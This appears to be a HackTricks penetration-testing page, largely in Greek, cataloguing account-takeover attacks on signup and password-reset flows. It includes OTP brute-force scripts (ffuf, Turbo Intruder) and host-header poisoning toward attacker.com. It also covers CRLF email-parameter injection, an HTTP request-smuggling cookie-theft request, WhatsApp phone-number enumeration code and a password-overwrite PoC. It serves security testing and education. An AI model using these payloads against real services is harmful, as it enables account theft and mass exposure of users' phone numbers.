# Ευπάθειες Εγγραφής και Κατάληψης

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Προσπάθησε να δημιουργήσεις χρησιμοποιώντας ένα υπάρχον όνομα χρήστη
- Δοκίμασε να παραλλάξεις το email:
- κεφαλαία
- +1@
- πρόσθεσε μια τελεία στο email
- ειδικοί χαρακτήρες στο όνομα του email (%00, %09, %20)
- Βάλε κενά χαρακτήρες μετά το email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Δοκίμασε κόλπα κανονικοποίησης παρόχων email (εξαρτάται από την υπηρεσία):
- Gmail αγνοεί τις τελείες και το subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` παραδίδονται στο `victim@gmail.com`
- Ορισμένοι πάροχοι δεν κάνουν διάκριση πεζών/κεφαλαίων στο local-part
- Ορισμένοι πάροχοι δέχονται unicode confusables. Δοκίμασε homoglyphs και soft hyphen `\u00AD` μέσα στο local-part
- Κακοποίησε αυτά για να: παρακάμψεις ελέγχους μοναδικότητας, αποκτήσεις διπλούς λογαριασμούς/προσκλήσεις workspace, ή μπλοκάρεις εγγραφές θυμάτων (προσωρινό DoS) ενώ ετοιμάζεις μια κατάληψη

### Username Enumeration

Έλεγξε αν μπορείς να καταλάβεις πότε ένα όνομα χρήστη έχει ήδη εγγραφεί στην εφαρμογή.

- Διαφορετικά μηνύματα σφάλματος ή HTTP status codes
- Διαφορές χρόνου (ένας υπάρχων χρήστης μπορεί να προκαλέσει lookup σε IdP/DB)
- Αυτόματη συμπλήρωση προφίλ στη φόρμα εγγραφής για γνωστά emails
- Έλεγξε flows ομάδας/πρόσκλησης: η εισαγωγή ενός email μπορεί να αποκαλύψει αν υπάρχει λογαριασμός

### Password Policy

Κατά τη δημιουργία χρήστη έλεγξε την πολιτική κωδικών (έλεγξε αν μπορείς να χρησιμοποιήσεις αδύναμους κωδικούς).\
Σε αυτή την περίπτωση μπορείς να προσπαθήσεις brute-force των credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) για να μάθεις πώς να επιχειρήσεις account takeovers ή να εξάγεις πληροφορίες μέσω **SQL Injections** σε φόρμες εγγραφής.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Μετά την εγγραφή, προσπάθησε να αλλάξεις το email και έλεγξε αν αυτή η αλλαγή επαληθεύεται σωστά ή αν μπορείς να την αλλάξεις σε αυθαίρετα emails.

### More Checks

- Έλεγξε αν μπορείς να χρησιμοποιήσεις **disposable emails** (mailinator, yopmail, 1secmail, etc.) ή να παρακάμψεις τη blocklist με subaddressing όπως `victim+mailinator@gmail.com`
- **Μακρύς** **κωδικός** (>200) οδηγεί σε **DoS**
- **Έλεγξε τα rate limits στη δημιουργία λογαριασμού**
- Χρησιμοποίησε username@**burp_collab**.net και ανάλυσε το **callback**
- Αν χρησιμοποιείται επαλήθευση τηλεφώνου, έλεγξε περιπτώσεις ανάλυσης/ένεσης τηλεφωνικών αριθμών

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Οι messenger που επικεντρώνονται σε phone-number εκθέτουν ένα **presence oracle** κάθε φορά που ο client συγχρονίζει τις επαφές. Η αναπαραγωγή των discovery requests του WhatsApp ιστορικά παρείχε **>100M lookups per hour**, επιτρέποντας σχεδόν πλήρη enumeration λογαριασμών.

**Ροή επίθεσης**

1. **Instrumenτ ένα επίσημο client** για να καταγράψεις το address-book upload request (authenticated blob of normalized E.164 numbers). Αναπαρήγαγε το με αριθμούς που παράγει ο attacker ενώ επαναχρησιμοποιείς τα ίδια cookies/device token.
2. **Ομαδοποίησε αριθμούς ανά request**: Το WhatsApp δέχεται χιλιάδες identifiers και επιστρέφει registered/unregistered μαζί με metadata (business, companion, κ.λπ.). Ανάλυσε τις απαντήσεις offline για να χτίσεις λίστες στόχων χωρίς να στέλνεις μηνύματα στα θύματα.
3. **Κλιμάκωσε οριζόντια** την enumeration με SIM banks, cloud devices, ή residential proxies ώστε να μην ενεργοποιείται throttling ανά account/IP/ASN.

**Μοντελοποίηση σχεδίου κλήσεων**

Μοντέλαρε το dialing plan κάθε χώρας για να αποφύγεις άκυρους υποψήφιους. Το NDSS dataset (`country-table.*`) απαριθμεί country codes, adoption density, και platform split ώστε να μπορείς να προτεραιοποιήσεις εύρη με υψηλό hit rate. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Δώστε προτεραιότητα σε προθέματα που ταιριάζουν με πραγματικές κατανομές (Mobile Country Code + National Destination Code) πριν την ερώτηση στο oracle, ώστε να διατηρηθεί χρήσιμο το throughput.

**Turning enumerations into targeted attacks**

- Χρησιμοποιήστε leaked phone numbers (π.χ. Facebook’s 2021 breach) στο oracle για να μάθετε ποιες ταυτότητες είναι ακόμα ενεργές πριν από phishing, SIM-swapping, ή spamming.
- Slice censuses ανά country/OS/app type για να βρείτε περιοχές με αδύναμο SMS filtering ή μεγάλη υιοθέτηση του WhatsApp Business για localized social engineering.

**Public-key reuse correlation**

Το WhatsApp εκθέτει το X25519 identity key κάθε λογαριασμού κατά το session setup. Ζητήστε identity material για κάθε enumerated number και αφαιρέστε διπλότυπα των public keys για να αποκαλύψετε account farms, cloned clients ή insecure firmware — shared keys deanonymize multi-SIM operations.

## Αδύναμη Επαλήθευση Email/Phone (OTP/Magic Link)

Οι ροές εγγραφής συχνά επαληθεύουν την ιδιοκτησία μέσω αριθμητικού OTP ή magic-link token. Συνηθισμένα σφάλματα:

- Guessable ή σύντομο OTP (4–6 digits) χωρίς αποτελεσματικό rate limiting ή IP/device tracking. Δοκιμάστε παράλληλα guesses και header/IP rotation.
- Επαναχρησιμοποίηση OTP μεταξύ ενεργειών ή λογαριασμών, ή να μην δεσμεύεται στον συγκεκριμένο χρήστη/ενέργεια (π.χ. ο ίδιος κωδικός λειτουργεί για login και signup, ή λειτουργεί μετά την αλλαγή email).
- Multi-value smuggling: μερικά backends αποδέχονται πολλαπλούς κωδικούς και επαληθεύουν αν κάποιος ταιριάζει. Δοκιμάστε:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: διακρίνετε wrong vs expired vs wrong-user codes από το status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Παράλληλη/ταυτόχρονη guessing για παράκαμψη των sequential lockouts (χρησιμοποιήστε Turbo Intruder στο Burp):

<details>
<summary>Turbo Intruder snippet για να κατακλύσει προσπάθειες 6‑digit OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: υποβάλετε το ίδιο έγκυρο OTP ταυτόχρονα σε δύο συνεδρίες· μερικές φορές μια συνεδρία γίνεται verified attacker account ενώ η ροή του victim επίσης ολοκληρώνεται.
- Επίσης δοκιμάστε Host header poisoning σε verification links (όπως το reset poisoning παρακάτω) για να leak ή να ολοκληρώσετε verification σε host που ελέγχεται από attacker.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Μια ισχυρή κατηγορία ευπαθειών προκύπτει όταν attacker εκτελεί ενέργειες στο email του victim πριν ο τελευταίος δημιουργήσει τον λογαριασμό του, και στη συνέχεια ο attacker επανακτά πρόσβαση αργότερα.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - Attacker: registers a classic account with victim email and sets a password
  - Victim: later signs up with SSO (same email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: creates account and holds a long‑lived session (don’t log out)
  - Victim: recovers/sets password and uses the account
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
  - Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
  - Attacker: initiates email‑change to attacker mail and withholds confirmation
  - Victim: recovers the account and starts using it
  - Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
  - Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
  - Victim: signs up via classic route
  - Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Ψάξτε για classic signup, SSO linking, email/phone change και password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
  - all other sessions and tokens are invalidated,
  - pending email/phone change capabilities are cancelled,
  - previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR σε παραμέτρους API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Ο attacker πρέπει να κάνει login με τον δικό του λογαριασμό και να πάει στο **Change password** feature.
2. Ξεκινήστε το Burp Suite και Intercept το request
3. Στείλτε το στο repeater tab και επεξεργαστείτε τις παραμέτρους : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Αδύναμο Token Επαναφοράς Κωδικού <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Το password reset token θα πρέπει να παράγεται τυχαία και να είναι μοναδικό κάθε φορά.\
Προσπαθήστε να προσδιορίσετε αν το token λήγει ή αν παραμένει πάντα το ίδιο — σε κάποιες περιπτώσεις ο αλγόριθμος παραγωγής είναι αδύναμος και μπορεί να μαντευτεί. Οι παρακάτω μεταβλητές μπορεί να χρησιμοποιούνται από τον αλγόριθμο.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger ένα password reset request χρησιμοποιώντας το API/UI για ένα συγκεκριμένο email π.χ: test@mail.com
2. Inspect την server response και ελέγξτε για `resetToken`
3. Έπειτα χρησιμοποιήστε το token σε ένα URL όπως `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Κάντε register στο σύστημα με ένα username που είναι ταυτόσημο με το username του θύματος, αλλά με εισαγωγή whitespace πριν και/ή μετά το username. π.χ: `"admin "`
2. Ζητήστε password reset με το malicious username σας.
3. Χρησιμοποιήστε το token που στάλθηκε στο email σας και επαναφέρετε τον κωδικό του θύματος.
4. Συνδεθείτε στον λογαριασμό του θύματος με τον νέο κωδικό.

Η πλατφόρμα CTFd ήταν ευάλωτη σε αυτή την επίθεση.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Βρείτε ένα XSS μέσα στην εφαρμογή ή σε ένα subdomain εάν τα cookies είναι scoped στο parent domain : `*.domain.com`
2. Leak το τρέχον **sessions cookie**
3. Authenticate ως ο χρήστης χρησιμοποιώντας το cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Χρησιμοποιήστε **smuggler** για να εντοπίσετε τον τύπο του HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Κατασκευάστε ένα request που θα υπερκαλύψει το `POST / HTTP/1.1` με τα παρακάτω δεδομένα:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` με στόχο να ανοίξετε redirect τα θύματα στο burpcollab και να κλέψετε τα cookies τους\
3. Το τελικό request μπορεί να μοιάζει με το ακόλουθο
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone αναφέρει εκμετάλλευση αυτού του σφάλματος\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Κατάληψη λογαριασμού μέσω CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Δημιουργήστε ένα payload για το CSRF, π.χ.: “HTML φόρμα με αυτόματη υποβολή για αλλαγή κωδικού”
2. Στείλτε το payload

### Κατάληψη λογαριασμού μέσω JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token μπορεί να χρησιμοποιηθεί για την αυθεντικοποίηση ενός χρήστη.

- Τροποποιήστε το JWT με άλλο User ID / Email
- Ελέγξτε για αδύναμη υπογραφή JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Ορισμένοι χειριστές signup εκτελούν upsert όταν το παρεχόμενο email υπάρχει ήδη. Αν το endpoint δέχεται ένα ελάχιστο body με email και password και δεν επιβάλλει έλεγχο ιδιοκτησίας, η αποστολή του email του θύματος θα αντικαταστήσει τον κωδικό του πριν την αυθεντικοποίηση.

- Discovery: συλλογή ονομάτων endpoint από bundled JS (ή κυκλοφορία mobile app), στη συνέχεια fuzz σε base paths όπως /parents/application/v4/admin/FUZZ χρησιμοποιώντας ffuf/dirsearch.
- Method hints: ένα GET που επιστρέφει μηνύματα όπως "Only POST request is allowed." συχνά υποδηλώνει το σωστό verb και ότι αναμένεται JSON body.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Παράδειγμα PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Επίπτωση: Full Account Takeover (ATO) χωρίς κανένα reset token, OTP ή επαλήθευση email.

## Αναφορές

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
